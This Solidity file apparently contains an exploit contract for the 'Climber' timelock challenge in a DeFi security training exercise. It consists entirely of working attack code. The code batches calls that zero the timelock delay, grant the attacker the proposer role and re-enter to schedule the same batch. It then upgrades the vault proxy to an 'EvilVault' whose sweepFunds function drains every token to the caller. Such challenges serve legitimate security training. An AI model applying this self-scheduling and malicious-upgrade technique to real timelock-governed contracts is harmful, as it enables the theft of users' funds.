pragma solidity ^0.8.0;

import '../climber/ClimberTimelock.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TimelockAttack {

    function becomeProposer(address timelock) public {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory data = new bytes[](3);
        bytes32 salt = 0;

        targets[0] = timelock;
        targets[1] = timelock;
        targets[2] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        ClimberTimelock timelockContract = ClimberTimelock(payable(timelock));

        data[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector, 0);

        data[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            timelockContract.PROPOSER_ROLE(), address(this));

        data[2] = abi.encodeWithSignature(
            "becomeProposer(address)", timelock);

        timelockContract.schedule(targets, values, data, salt);
    }

    function upgrade(address timelock, address vault, address evilVault) public {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory data = new bytes[](1);
        bytes32 salt = 0;

        targets[0] = vault;
        values[0] = 0;
        data[0] = abi.encodeWithSignature("upgradeTo(address)", evilVault);

        ClimberTimelock timelockContract = ClimberTimelock(payable(timelock));

        timelockContract.schedule(targets, values, data, salt);
        timelockContract.execute(targets, values, data, salt);
    }

}

contract EvilVault {

    // ERC1967UpgradeUpgradeable._upgradeToAndCallUUPS checks for this
    bytes32 public proxiableUUID = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))),
                "Transfer failed");
    }

}
